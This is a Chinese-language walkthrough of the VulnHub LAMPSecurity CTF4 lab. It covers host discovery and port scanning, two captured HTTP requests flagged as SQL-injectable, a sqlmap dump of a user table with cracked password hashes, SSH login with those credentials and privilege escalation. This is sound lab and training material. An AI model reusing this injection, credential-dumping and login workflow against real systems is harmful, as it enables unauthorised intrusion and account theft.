# 下载地址

    
    
    https://download.vulnhub.com/lampsecurity/ctf4.zip
    

# **实战演练**

使用netdiscover命令查找靶机的IP。

![image.png](https://image.3001.net/images/20190820/1566285614_5d5b9f2e21b2f.png)  

使用nmap查看靶机开放的端口

![image.png](https://image.3001.net/images/20190820/1566285843_5d5ba0131d233.png)  

打开浏览器

![image.png](https://image.3001.net/images/20190820/1566285857_5d5ba02196a78.png)使用avws进行扫描

![image.png](https://image.3001.net/images/20190820/1566286512_5d5ba2b0193e0.png)目录遍历漏洞

![image.png](https://image.3001.net/images/20190820/1566286537_5d5ba2c987637.png)注入

    
    
    POST /admin/index.php HTTP/1.1
    Content-Length: 149
    Content-Type: application/x-www-form-urlencoded
    X-Requested-With: XMLHttpRequest
    Referer: http://192.168.0.104:80/
    Cookie: SQMSESSID=q683eq5e3hqdtute97e0bh9ub5; squirrelmail_language=en_US
    Host: 192.168.0.104
    Connection: Keep-alive
    Accept-Encoding: gzip,deflate
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
    Accept: */*
    
    password=1&username=bbuaootc
    
    

![image.png](https://image.3001.net/images/20190820/1566286738_5d5ba39297f91.png)  

    
    
    GET /index.html?id=7&page=blog&title=Blog HTTP/1.1
    X-Requested-With: XMLHttpRequest
    Referer: http://192.168.0.104:80/
    Cookie: SQMSESSID=q683eq5e3hqdtute97e0bh9ub5; squirrelmail_language=en_US
    Host: 192.168.0.104
    Connection: Keep-alive
    Accept-Encoding: gzip,deflate
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
    Accept: */*
    
    

![image.png](https://image.3001.net/images/20190820/1566287155_5d5ba53368ae2.png)用sqlmap跑到user表

![image.png](https://image.3001.net/images/20190820/1566287392_5d5ba620f13ec.png)

    
    
    +---------+-----------+--------------------------------------------------+
    | user_id | user_name | user_pass                                        |
    +---------+-----------+--------------------------------------------------+
    | 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
    | 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
    | 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
    | 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
    | 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |
    | 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
    +---------+-----------+--------------------------------------------------+
      
    

用这些用户名和密码看看能不能登录SSH

![image.png](https://image.3001.net/images/20190820/1566287502_5d5ba68e5831c.png)好儿戏阿=-=居然直接可以提权

![image.png](https://image.3001.net/images/20190820/1566287667_5d5ba733260f0.png)  

